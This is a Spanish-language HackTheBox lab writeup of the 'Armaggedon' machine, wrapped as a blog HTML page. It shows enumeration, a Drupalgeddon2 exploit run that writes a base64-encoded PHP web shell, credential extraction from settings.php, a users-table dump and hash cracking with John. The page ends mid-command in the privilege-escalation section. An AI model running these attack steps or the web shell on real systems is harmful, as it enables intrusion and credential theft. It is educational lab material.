@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Armaggedon HTB Writeup - </title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="Armaggedon HTB WriteUp - Easy Linux Machine from HackTheBox" /><meta name="keywords" content='linux, writeup, easy' /><meta itemprop="name" content="Armaggedon HTB Writeup">
+<meta itemprop="description" content="Armaggedon HTB WriteUp - Easy Linux Machine from HackTheBox"><meta itemprop="datePublished" content="2021-07-24T15:39:00+02:00" />
+<meta itemprop="dateModified" content="2021-07-24T15:39:00+02:00" />
+<meta itemprop="wordCount" content="1506">
+<meta itemprop="keywords" content="linux,writeup,easy," /><meta property="og:title" content="Armaggedon HTB Writeup" />
+<meta property="og:description" content="Armaggedon HTB WriteUp - Easy Linux Machine from HackTheBox" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/armaggedon-htb/armaggedon-htb/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-24T15:39:00+02:00" />
+<meta property="article:modified_time" content="2021-07-24T15:39:00+02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Armaggedon HTB Writeup"/>
+<meta name="twitter:description" content="Armaggedon HTB WriteUp - Easy Linux Machine from HackTheBox"/>
+<meta name="application-name" content="rottenbytes">
+<meta name="apple-mobile-web-app-title" content="rottenbytes"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/posts/armaggedon-htb/armaggedon-htb/" /><link rel="next" href="/posts/remote-htb/remote-htb/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Armaggedon HTB Writeup",
+    "inLanguage": "",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "\/posts\/armaggedon-htb\/armaggedon-htb\/"
+    },"genre": "posts","keywords": "linux, writeup, easy","wordcount":  1506 ,
+    "url": "\/posts\/armaggedon-htb\/armaggedon-htb\/","datePublished": "2021-07-24T15:39:00+02:00","dateModified": "2021-07-24T15:39:00+02:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "rottenbytes"
+      },"description": "Armaggedon HTB WriteUp - Easy Linux Machine from HackTheBox"
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title=""><span id="typeit-header-desktop" class="typeit"></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title=""><span id="typeit-header-title-mobile" class="typeit"></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Armaggedon HTB Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      rottenbytes</span></span>
+          <span class="post-category">included in <a href="/categories/writeups/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> writeups</a>&ensp;<a href="/categories/htb/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> htb</a></span></div>
+      <div class="post-meta-line"><span title="published on 2021-07-24 15:39:00"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2021-07-24">2021-07-24</time></span>&nbsp;<span title="Updated on 2021-07-24 15:39:00"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2021-07-24">2021-07-24</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>1506 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>8 minutes</span>&nbsp;</div>
+    </div><div class="featured-image"><img loading="lazy" src="../assets/posts/armaggedon/banner.png" srcset="/../assets/posts/armaggedon/banner.png, ../assets/posts/armaggedon/banner.png 1.5x, /../assets/posts/armaggedon/banner.png 2x" sizes="auto" data-title="Armaggedon HTB WriteUp - Easy Linux Machine from HackTheBox" data-alt="/../assets/posts/armaggedon/banner.png" width="592" height="359" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeración">Enumeración</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumeración-http---port-80-tcp">Enumeración HTTP - port 80 (TCP)</a>
+      <ul>
+        <li><a href="#dirsearch">Dirsearch</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#usertxt">user.txt</a></li>
+    <li><a href="#priv-esc">Priv. Esc.</a>
+      <ul>
+        <li><a href="#roottxt">root.txt</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="enumeración">Enumeración</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
+|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
+| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+</code></pre></div><p>Nmap sólo nos muestra que hay dos puertos abiertos en la máquina, un SSH y un HTTP. Podemos ver que bajo el puerto 80 está corriendo el CMS Drupal 7, lo que ya me hace pensar sobre el famoso exploit de <em>Drupalggedon</em>, además, nmap también nos llega a sacar algunos de los directorios de <em>/robots.txt</em>.</p>
+<h2 id="enumeración-http---port-80-tcp">Enumeración HTTP - port 80 (TCP)</h2>
+<p><img loading="lazy" src="../assets/posts/armaggedon/web_login.png" srcset="/../assets/posts/armaggedon/web_login.png, ../assets/posts/armaggedon/web_login.png 1.5x, /../assets/posts/armaggedon/web_login.png 2x" sizes="auto" data-title="/../assets/posts/armaggedon/web_login.png" data-alt="/../assets/posts/armaggedon/web_login.png" width="1572" height="783" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Al acceder a la web, lo primero que se nos muestra es una página sin ningún contenido, simplemente un panel a la izquierda para loguearnos en ella. Intenando credenciales por defecto e intentar colar una SQLi no consigo nada, así que me pongo a fuzzear y a seguir trasteando.</p>
+<h3 id="dirsearch">Dirsearch</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">200</span>   317B   http://10.10.10.233:80/.editorconfig
+<span style="color:#ae81ff">200</span>   174B   http://10.10.10.233:80/.gitignore
+<span style="color:#ae81ff">200</span>     1KB  http://10.10.10.233:80/COPYRIGHT.txt
+<span style="color:#ae81ff">200</span>   109KB  http://10.10.10.233:80/CHANGELOG.txt
+<span style="color:#ae81ff">200</span>     2KB  http://10.10.10.233:80/INSTALL.mysql.txt
+<span style="color:#ae81ff">200</span>     2KB  http://10.10.10.233:80/INSTALL.pgsql.txt
+<span style="color:#ae81ff">200</span>    18KB  http://10.10.10.233:80/INSTALL.txt
+<span style="color:#ae81ff">200</span>     9KB  http://10.10.10.233:80/MAINTAINERS.txt
+<span style="color:#ae81ff">200</span>    18KB  http://10.10.10.233:80/LICENSE.txt
+<span style="color:#ae81ff">200</span>     5KB  http://10.10.10.233:80/README.txt
+<span style="color:#ae81ff">200</span>    10KB  http://10.10.10.233:80/UPGRADE.txt
+<span style="color:#ae81ff">301</span>   237B   http://10.10.10.233:80/includes    -&gt; REDIRECTS TO: http://10.10.10.233/includes/
+<span style="color:#ae81ff">200</span>    10KB  http://10.10.10.233:80/includes/
+<span style="color:#ae81ff">200</span>   132KB  http://10.10.10.233:80/includes/bootstrap.inc
+<span style="color:#ae81ff">200</span>     7KB  http://10.10.10.233:80/index.php
+<span style="color:#ae81ff">200</span>     3KB  http://10.10.10.233:80/install.php
+<span style="color:#ae81ff">301</span>   233B   http://10.10.10.233:80/misc    -&gt; REDIRECTS TO: http://10.10.10.233/misc/
+<span style="color:#ae81ff">301</span>   236B   http://10.10.10.233:80/modules    -&gt; REDIRECTS TO: http://10.10.10.233/modules/
+<span style="color:#ae81ff">200</span>     9KB  http://10.10.10.233:80/modules/
+<span style="color:#ae81ff">301</span>   237B   http://10.10.10.233:80/profiles    -&gt; REDIRECTS TO: http://10.10.10.233/profiles/
+<span style="color:#ae81ff">200</span>   743B   http://10.10.10.233:80/profiles/standard/standard.info
+<span style="color:#ae81ff">200</span>   271B   http://10.10.10.233:80/profiles/minimal/minimal.info
+<span style="color:#ae81ff">200</span>   278B   http://10.10.10.233:80/profiles/testing/testing.info
+<span style="color:#ae81ff">200</span>     2KB  http://10.10.10.233:80/robots.txt
+<span style="color:#ae81ff">301</span>   236B   http://10.10.10.233:80/scripts    -&gt; REDIRECTS TO: http://10.10.10.233/scripts/
+<span style="color:#ae81ff">200</span>     3KB  http://10.10.10.233:80/scripts/
+<span style="color:#ae81ff">301</span>   234B   http://10.10.10.233:80/sites    -&gt; REDIRECTS TO: http://10.10.10.233/sites/
+<span style="color:#ae81ff">200</span>   151B   http://10.10.10.233:80/sites/all/libraries/README.txt
+<span style="color:#ae81ff">200</span>   904B   http://10.10.10.233:80/sites/README.txt
+<span style="color:#ae81ff">200</span>     1KB  http://10.10.10.233:80/sites/all/modules/README.txt
+<span style="color:#ae81ff">200</span>     0B   http://10.10.10.233:80/sites/example.sites.php
+<span style="color:#ae81ff">200</span>  1020B   http://10.10.10.233:80/sites/all/themes/README.txt
+<span style="color:#ae81ff">301</span>   235B   http://10.10.10.233:80/themes    -&gt; REDIRECTS TO: http://10.10.10.233/themes/
+<span style="color:#ae81ff">200</span>     2KB  http://10.10.10.233:80/themes/
+<span style="color:#ae81ff">200</span>     2KB  http://10.10.10.233:80/web.config
+<span style="color:#ae81ff">200</span>    42B   http://10.10.10.233:80/xmlrpc.php
+</code></pre></div><p>Sabiendo que es un <em>Drupal 7</em>, lo que más me interesa es sacar la versión exacta, así que después del fuzzeo simple con dirsearch el directorio que más me llama la atención es el <em>CHANGELOG.txt</em>.</p>
+<p><img loading="lazy" src="../assets/posts/armaggedon/drupal_version.png" srcset="/../assets/posts/armaggedon/drupal_version.png, ../assets/posts/armaggedon/drupal_version.png 1.5x, /../assets/posts/armaggedon/drupal_version.png 2x" sizes="auto" data-title="/../assets/posts/armaggedon/drupal_version.png" data-alt="/../assets/posts/armaggedon/drupal_version.png" width="710" height="167" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Accediendo a él, puedo sacar qué versión del CMS está corriendo la máquina.</p>
+<h1 id="explotación">Explotación</h1>
+<h2 id="usertxt">user.txt</h2>
+<p>Una vez obtenida la versión de <em>Drupal</em>, busco exploits locales tratando de sacar algo jugoso como un RCE o alguna vulnerabilidad que nos permita la inyección de código para poder explotar el servicio.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ searchsploit drupal <span style="color:#ae81ff">7</span>                                                                                                                                                
+------------------------------------------------------------------------------------------------------------------------------------------------------------ 
+ Exploit Title                                                                                                                                              |  Path               
+------------------------------------------------------------------------------------------------------------------------------------------------------------ 
+...snip...                                                                                
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span style="color:#e6db74">&#39;Drupalgeddon2&#39;</span> Remote Code Execution                                                                         | php/webapps/44449.rb
+...snip...
+</code></pre></div><p>Usando <em>searchsploit</em> nos salen un montón de exploits disponibles para <em>Drupal</em>, pero me fijo en <em>Drupalggedon2</em> ya que nos permite obtener un RCE. Le hago un mirror al exploit para traérmelo en el directorio en el que estoy con  <code>searchsploit -m php/webapps/44449.rb</code>. Este artículo <a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/"target="_blank" rel="external nofollow noopener noreferrer">Uncovering Drupalgeddon 2</a> explica cómo funciona la vulnerabilidad de  <em>Drupalggedon2</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby 44449.rb 
+ruby: warning: shebang line ending with <span style="color:#ae81ff">\r</span> may cause problems
+Usage: ruby drupalggedon2.rb &lt;target&gt; <span style="color:#f92672">[</span>--authentication<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--verbose<span style="color:#f92672">]</span>
+Example <span style="color:#66d9ef">for</span> target that does not require authentication:
+       ruby drupalgeddon2.rb https://example.com
+Example <span style="color:#66d9ef">for</span> target that does require authentication:
+       ruby drupalgeddon2.rb https://example.com --authentication
+</code></pre></div><p>Corriendo el exploit escrito en <em>ruby</em>, nos dice los parámetros que debemos pasarle para obtener el RCE. En este caso, al no tener credenciales para autenticarnos en la web, simplemente le pasaremos la URL donde se ecuentra <em>Drupal</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby 44449.rb http://10.10.10.233
+ruby: warning: shebang line ending with <span style="color:#ae81ff">\r</span> may cause problems
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> --<span style="color:#f92672">==[</span>::#Drupalggedon2::<span style="color:#f92672">]==</span>--
+--------------------------------------------------------------------------------
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Target : http://10.10.10.233/
+--------------------------------------------------------------------------------
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found  : http://10.10.10.233/CHANGELOG.txt    <span style="color:#f92672">(</span>HTTP Response: 200<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Drupal!: v7.56
+--------------------------------------------------------------------------------
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Testing: Form   <span style="color:#f92672">(</span>user/password<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Testing: Clean URLs
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Result : Clean URLs disabled <span style="color:#f92672">(</span>HTTP Response: 404<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Isn<span style="color:#e6db74">&#39;t an issue for Drupal v7.x
+</span><span style="color:#e6db74">--------------------------------------------------------------------------------
+</span><span style="color:#e6db74">[*] Testing: Code Execution   (Method: name)
+</span><span style="color:#e6db74">[i] Payload: echo YTWOVLDO
+</span><span style="color:#e6db74">[+] Result : YTWOVLDO
+</span><span style="color:#e6db74">[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+</span><span style="color:#e6db74">--------------------------------------------------------------------------------
+</span><span style="color:#e6db74">[*] Testing: Existing file   (http://10.10.10.233/shell.php)
+</span><span style="color:#e6db74">[i] Response: HTTP 404 // Size: 5
+</span><span style="color:#e6db74">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+</span><span style="color:#e6db74">[*] Testing: Writing To Web Root   (./)
+</span><span style="color:#e6db74">[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+</span><span style="color:#e6db74">[+] Result : &lt;?php if( isset( $_REQUEST[&#39;</span>c<span style="color:#e6db74">&#39;] ) ) { system( $_REQUEST[&#39;</span>c<span style="color:#e6db74">&#39;] . &#39;</span> 2&gt;&amp;1<span style="color:#e6db74">&#39; ); }
+</span><span style="color:#e6db74">[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+</span><span style="color:#e6db74">--------------------------------------------------------------------------------
+</span><span style="color:#e6db74">[i] Fake PHP shell:   curl &#39;</span>http://10.10.10.233/shell.php<span style="color:#e6db74">&#39; -d &#39;</span>c<span style="color:#f92672">=</span>hostname<span style="color:#960050;background-color:#1e0010">&#39;</span>
+armageddon.htb&gt;&gt; id
+uid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>system_u:system_r:httpd_t:s0
+</code></pre></div><p>Conseguimos una ejecución de comandos en la máquina, empiezo a trastear a ver qué hay por ahí que nos pueda ser útil.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">armageddon.htb&gt;&gt; ls
+CHANGELOG.txt
+COPYRIGHT.txt
+INSTALL.mysql.txt
+INSTALL.pgsql.txt
+INSTALL.sqlite.txt
+INSTALL.txt
+LICENSE.txt
+MAINTAINERS.txt
+README.txt
+UPGRADE.txt
+authorize.php
+cron.php
+includes
+index.php
+install.php
+misc
+modules
+profiles
+robots.txt
+scripts
+shell.php
+sites
+themes
+update.php
+web.config
+xmlrpc.php
+
+armageddon.htb&gt;&gt; ls sites/
+README.txt
+all
+default
+example.sites.php
+
+armageddon.htb&gt;&gt; ls sites/default
+default.settings.php
+files
+settings.php
+
+armageddon.htb&gt;&gt; cat sites/default/settings.php
+
+...snip...
+$databases <span style="color:#f92672">=</span> array <span style="color:#f92672">(</span>                                                                             
+  <span style="color:#e6db74">&#39;default&#39;</span> <span style="color:#f92672">=</span>&gt;  
+  array <span style="color:#f92672">(</span>      
+    <span style="color:#e6db74">&#39;default&#39;</span> <span style="color:#f92672">=</span>&gt;
+    array <span style="color:#f92672">(</span>    
+      <span style="color:#e6db74">&#39;database&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;drupal&#39;</span>,
+      <span style="color:#e6db74">&#39;username&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;drupaluser&#39;</span>,
+      <span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;CQHEy@9M*m23gBVj&#39;</span>,
+      <span style="color:#e6db74">&#39;host&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span>, 
+      <span style="color:#e6db74">&#39;port&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;&#39;</span>,  
+      <span style="color:#e6db74">&#39;driver&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;mysql&#39;</span>,  
+      <span style="color:#e6db74">&#39;prefix&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;&#39;</span>,
+    <span style="color:#f92672">)</span>,
+  <span style="color:#f92672">)</span>,           
+<span style="color:#f92672">)</span>; 
+...snip...
+
+armageddon.htb&gt;&gt; cat /etc/passwd | grep sh
+root:x:0:0:root:/root:/bin/bash
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+</code></pre></div><p>Conseguimos sacar una contraseña en texto plano y un usuario de la base de datos de <em>Drupal</em>. Antes de nada, intento acceder por SSH con el usuario de <em>brucetherealadmin</em> y la contraseña usada en MySQL a ver si hay suerte de que se estén reutilizando credenciales, pero no funciona.</p>
+<p>Volviendo a la shell que ya tenemos, voy a intentar de ver las tablas que contiene la base de datos de <em>Drupal</em>. Aparecen un montón de tablas, pero la que llama la atención es la de <em>users</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">armageddon.htb&gt;&gt; mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e <span style="color:#e6db74">&#39;show tables;&#39;</span>                                                                                         
+...snip...
+users
+...snip...
+
+armageddon.htb&gt;&gt; mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e <span style="color:#e6db74">&#39;select * from users;&#39;</span>
+uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
+<span style="color:#ae81ff">0</span>                                               NULL    <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       NULL            <span style="color:#ae81ff">0</span>               NULL
+<span style="color:#ae81ff">1</span>       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   <span style="color:#ae81ff">1606998756</span>      <span style="color:#ae81ff">1607077194</span>      <span style="color:#ae81ff">1607076276</span>   1Europe/London           <span style="color:#ae81ff">0</span>       admin@armageddon.eu     a:1:<span style="color:#f92672">{</span>s:7:<span style="color:#e6db74">&#34;overlay&#34;</span>;i:1;<span style="color:#f92672">}</span>
+</code></pre></div><p>Conseguimos sacar una contraseña hasheada del usuario <em>brucetherealadmin</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ john hash -w<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Drupal7, $S$ <span style="color:#f92672">[</span>SHA512 256/256 AVX2 4x<span style="color:#f92672">])</span>
+Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">32768</span> <span style="color:#66d9ef">for</span> all loaded hashes
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+booboo           <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+</code></pre></div><p>Con la herramienta de <em>John the Ripper</em> conseguimos crackearla y sacarla en texto plano.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh brucetherealadmin@10.10.10.233
+<span style="color:#f92672">[</span>brucetherealadmin@armageddon ~<span style="color:#f92672">]</span>$ cat user.txt 
+a3d2f9************************
+</code></pre></div><p>Ahora sí que conseguimos acceder por SSH a la máquina bajo el usuario <em>brucetherealadmin</em>. Una vez obtenido el usuario, ahora trataré de conseguir root y tener control total sobre la máquina.</p>
+<h2 id="priv-esc">Priv. Esc.</h2>
+<h3 id="roottxt">root.txt</h3>
+<p>Antes de lanzar <em>LinPeas</em> o algún otro script que nos ayude a la enumeración de la máquina para descubrir posibles vectores para escalar privilegios, iré de más simple a más complejo comenzando con un <code>sudo -l</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>brucetherealadmin@armageddon ~<span style="color:#f92672">]</span>$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> brucetherealadmin on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;MAIL PS1 PS2 QTDIR
